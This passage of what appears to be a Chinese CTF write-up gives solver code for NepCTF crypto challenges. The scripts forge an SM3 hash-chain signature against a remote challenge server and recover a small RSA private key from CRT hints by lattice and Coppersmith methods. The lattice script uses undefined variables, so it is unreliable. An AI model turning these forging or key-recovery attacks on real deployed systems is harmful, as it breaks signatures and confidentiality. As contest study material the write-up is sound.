class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    step = a + [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(h, <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == HEX[i]:</span><br><span class="line">                s += j</span><br><span class="line">        step[<span class="number">32</span> + i] = s % <span class="number">255</span></span><br><span class="line">    <span class="keyword">return</span> step</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_step = steps_from_msg(target_msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm3_n</span>(<span class="params">hexstr, n</span>):</span><br><span class="line">    d = <span class="built_in">bytes</span>.fromhex(hexstr)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        d = <span class="built_in">bytes</span>.fromhex(SM3(d))</span><br><span class="line">    <span class="keyword">return</span> d.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MIN_STEP = [<span class="number">999</span>] * <span class="number">48</span></span><br><span class="line">SIGMA = [<span class="string">&#x27;&#x27;</span>] * <span class="number">48</span></span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT,ssl=<span class="literal">True</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;initializing...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 随机消息</span></span><br><span class="line">    m = urandom(<span class="number">32</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;msg: &#x27;</span>, m.<span class="built_in">hex</span>().encode())</span><br><span class="line">    raw = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(raw)</span><br><span class="line">    sig = <span class="built_in">eval</span>(raw.decode())</span><br><span class="line">    step_obs = steps_from_msg(m)</span><br><span class="line"></span><br><span class="line">    updated = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        <span class="keyword">if</span> step_obs[i] &lt; MIN_STEP[i]:</span><br><span class="line">            MIN_STEP[i] = step_obs[i]</span><br><span class="line">            SIGMA[i] = sig[i]</span><br><span class="line">            updated = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(MIN_STEP[i] &lt;= target_step[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+] coverage OK, forging...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sigma_final = [</span><br><span class="line">    sm3_n(SIGMA[i], target_step[i] - MIN_STEP[i])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;give me a qq: &#x27;</span>, <span class="built_in">str</span>(sigma_final).encode())</span><br><span class="line"><span class="built_in">print</span>(io.recvline().decode().strip())</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="ezRSA2"><a href="#ezRSA2" class="headerlink" title="ezRSA2"></a>ezRSA2</h1><p>好耶，随缘师傅的题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime, getRandomNBitInteger, GCD, inverse, long_to_bytes, bytes_to_long, sieve_base  </span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_parameters</span>(<span class="params">gamma=<span class="number">0.33</span>, beta=<span class="number">0.33</span></span>):  </span><br><span class="line">    p = getStrongPrime(<span class="number">1024</span>)  </span><br><span class="line">    q = getStrongPrime(<span class="number">1024</span>)  </span><br><span class="line">    N = p*q  </span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">        d = getRandomNBitInteger(<span class="built_in">int</span>(<span class="number">2048</span>*beta))  </span><br><span class="line">        <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    e = inverse(d, phi)  </span><br><span class="line">      </span><br><span class="line">    hints = []  </span><br><span class="line">    M = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sieve_base)):  </span><br><span class="line">        li = sieve_base[i]  </span><br><span class="line">        hints.append(d%li)  </span><br><span class="line">        M *= li  </span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= <span class="number">1024</span>*gamma:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">return</span> e, N, hints  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():  </span><br><span class="line">    e,N,hints = gen_parameters()  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e=<span class="subst">&#123;<span class="built_in">hex</span>(e)&#125;</span>&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;N=<span class="subst">&#123;<span class="built_in">hex</span>(N)&#125;</span>\n&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hints=<span class="subst">&#123;hints&#125;</span>\n&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">    flag_prefix = <span class="string">b&#x27;NepCTF&#123;&#x27;</span>  </span><br><span class="line">    <span class="keyword">assert</span> flag.startswith(flag_prefix)  </span><br><span class="line">    <span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">    pt = bytes_to_long(flag[<span class="built_in">len</span>(flag_prefix):-<span class="number">1</span>])  </span><br><span class="line">    ct = <span class="built_in">pow</span>(pt, e, N)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;ct=<span class="subst">&#123;<span class="built_in">hex</span>(ct)&#125;</span>&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">main()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line"><span class="string">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hints=[1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>当时第一想法也是直接造格做，看了随缘师傅的wp才知道打二元copper也可行，两种方法都写一下吧。当然首先crt求出部分d还是不变的</p>
<p>根据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hints = []  </span><br><span class="line">    M = <span class="number">1</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sieve_base)):  </span><br><span class="line">        li = sieve_base[i]  </span><br><span class="line">        hints.append(d%li)  </span><br><span class="line">        M *= li  </span><br><span class="line">        <span class="keyword">if</span> M.bit_length() &gt;= <span class="number">1024</span>*gamma:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br></pre></td></tr></table></figure>

<p>就能得到d的低位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dl = CRT(hints, <span class="built_in">list</span>(sieve_base)[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br></pre></td></tr></table></figure>



<h2 id="格"><a href="#格" class="headerlink" title="格"></a>格</h2><p>我们设</p>
<p><img src="https://ooo.0x0.ooo/2025/08/04/Ofkbvc.png" alt="Ofkbvc.png"></p>
<p>并令r&#x3D;p+q</p>
<p>根据RSA可以列出等式$ed-1&#x3D;k(N-r+1)$将d换为$dl+k_1M$，这里可以列出$e(dl+k_1M)-1&#x3D;k_2(N-r+1)$然后展开移项$e\cdot dl-1+k_1e\cdot M+k_2(N+1)&#x3D;k_2r$。那么我们就可以根据这个等式造格<br>$$<br>(k_1,1,k_2) \left(\begin{matrix} 1&amp;&amp;e\cdot tmp\ &amp;1&amp;e\cdot dl-1\ &amp;&amp;N+1\ \end{matrix}\right) &#x3D;(k_1,1,k_2r)<br>$$<br>因为d&#x3D;dl+k$_1$M,所以我们可以大致估计k1和k2的数量级分别为2$^{333}$和2$^{673}$,那么我们肯定要乘上大数进行配平，根据k_2r的数量级来判断下，分别乘一个2$^{1365}$和2$^{1698}$,然后直接造格打即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N=<span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line"></span><br><span class="line">ct=<span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"></span><br><span class="line">hints = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line">d0 = CRT(hints, <span class="built_in">list</span>(sieve_base)[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line">M = prod(<span class="built_in">list</span>(sieve_base)[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(dd)</span><br><span class="line">Ge = Matrix(ZZ, <span class="number">3</span>, <span class="number">3</span>)</span><br><span class="line">Ge[<span class="number">0</span>, <span class="number">0</span>] = <span class="number">2</span> ** <span class="number">1365</span></span><br><span class="line">Ge[<span class="number">1</span>, <span class="number">1</span>] = <span class="number">2</span> ** <span class="number">1698</span></span><br><span class="line">Ge[<span class="number">0</span>, <span class="number">2</span>] = e*M</span><br><span class="line">Ge[<span class="number">1</span>, <span class="number">2</span>] = e*d0-<span class="number">1</span></span><br><span class="line">Ge[<span class="number">2</span>, <span class="number">2</span>] = N+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">L = Ge.LLL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> L:</span><br><span class="line">    d = dd + row[<span class="number">0</span>]//K1*tmp</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(d).bit_length(), row[<span class="number">1</span>]==K2)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(d).bit_length() == <span class="built_in">int</span>(<span class="number">2048</span>*<span class="number">0.33</span>):</span><br><span class="line">        m = <span class="built_in">pow</span>(ct, d, N)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="二元copper"><a href="#二元copper" class="headerlink" title="二元copper"></a>二元copper</h2><p>还是根据$e(dl+k_1M)-1&#x3D;k_2(N-r+1)$这个式子，等式两边同时模eM，得到$1-edl+k(N+1-r)&#x3D;0 mod eM$，直接对K和r打二元copper即可</p>
<p>(搬一手随缘师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> sieve_base, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">beta = <span class="number">0.33</span></span><br><span class="line"></span><br><span class="line">e=<span class="number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span></span><br><span class="line">N=<span class="number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span></span><br><span class="line"></span><br><span class="line">hints=[<span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">18</span>, <span class="number">30</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">20</span>, <span class="number">62</span>, <span class="number">66</span>, <span class="number">1</span>, <span class="number">22</span>, <span class="number">56</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">78</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">96</span>, <span class="number">112</span>, <span class="number">50</span>, <span class="number">93</span>, <span class="number">158</span>, <span class="number">97</span>, <span class="number">146</span>, <span class="number">8</span>, <span class="number">65</span>, <span class="number">96</span>, <span class="number">186</span>, <span class="number">161</span>, <span class="number">90</span>, <span class="number">131</span>, <span class="number">46</span>, <span class="number">32</span>, <span class="number">140</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">43</span>, <span class="number">151</span>, <span class="number">234</span>]</span><br><span class="line"></span><br><span class="line">ct=<span class="number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># defund small_roots</span></span><br><span class="line"><span class="comment"># https://github.com/defund/coppersmith</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(f, Polynomial):</span><br><span class="line">        x, = polygens(f.base_ring(), f.variable_name(), <span class="number">1</span>)</span><br><span class="line">        f = f(x)</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line">    </span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">        base = N**(m-i) * f**i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line">    st1 = time.time()</span><br><span class="line">    </span><br><span class="line">    B = (B.dense_matrix()).LLL(epsilon=<span class="number">0.99</span>)</span><br><span class="line">    <span class="comment"># B = flatter(B)</span></span><br><span class="line">    </span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;time of lattice reduction: <span class="subst">&#123;end-st1&#125;</span>s&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;B.dimensions() = &#125;</span>&#x27;</span>)</span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">li_list = <span class="built_in">list</span>(sieve_base[<span class="number">1</span>:<span class="built_in">len</span>(hints)+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    M = prod(li_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;M.bit_length() = &#125;</span>&#x27;</span>)</span><br><span class="line">    dM = CRT(hints, li_list)</span><br><span class="line">    <span class="comment"># ed-1 = k(N+1-(p+q))</span></span><br><span class="line">    <span class="comment"># k(N+1)-k(p+q)-(e*dM-1) = 0(eM)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;dM = &#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;dM.bit_length() = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    PR = PolynomialRing(Zmod(e*M), <span class="string">&#x27;x,y&#x27;</span>)</span><br><span class="line">    x,y = PR.gens()</span><br><span class="line"></span><br><span class="line">    f = x*(N+<span class="number">1</span>)-x*y-(e*dM-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    XX = (e*<span class="number">2</span>**ceil(<span class="number">2048</span>*beta)) // N</span><br><span class="line">    YY = <span class="number">3</span>*<span class="number">2</span>**<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">    roots = <span class="built_in">list</span>(small_roots(f, [XX,YY], m=<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(roots)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(roots) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    k, r = roots[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># ed-1=k(N+1-r)</span></span><br><span class="line">    k, r = ZZ(k), ZZ(r)</span><br><span class="line">    d = (k*(N+<span class="number">1</span>-r) + <span class="number">1</span>) // e</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d=&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;d.bit_length() = &#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">assert</span> e*d-<span class="number">1</span>==k*(N+<span class="number">1</span>-r)</span><br><span class="line"></span><br><span class="line">    pt = <span class="built_in">pow</span>(ct, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(pt))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    attack()</span><br><span class="line">    </span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h1 id="Lattice-Bros"><a href="#Lattice-Bros" class="headerlink" title="Lattice Bros"></a>Lattice Bros</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#已知α的极小多项式为三次多项式f(x),即f(α)=0,且α≈54236.606188881754809671280151541781895183337725393</span></span><br><span class="line"><span class="comment">#上述极小多项式的常数项为a0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> a0,alpha</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt,log2</span><br><span class="line"></span><br><span class="line">d=<span class="number">981020902672546902438782010902608140583199504862558032616415</span></span><br><span class="line">p = d - a0</span><br><span class="line"></span><br><span class="line">k=sqrt(log2(p))+log2(log2(p))</span><br><span class="line">B = <span class="number">2</span>**<span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> B &lt; p/<span class="number">2</span>**k</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line"><span class="keyword">assert</span> m &gt; <span class="number">2</span>*sqrt(log2(p))</span><br><span class="line"></span><br><span class="line">samples = []</span><br><span class="line">betas = []</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;samples.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    t = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    beta = random.randint(-B + <span class="number">1</span>, B - <span class="number">1</span>)</span><br><span class="line">    a = (t * alpha - beta) % p</span><br><span class="line">    samples.append((t, a))</span><br><span class="line">    betas.append(beta)</span><br><span class="line"></span><br><span class="line">f.write(<span class="built_in">str</span>(samples))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">assert</span> (betas[i]-samples[i][<span class="number">0</span>]*alpha+samples[i][<span class="number">1</span>])%p == <span class="number">0</span></span><br><span 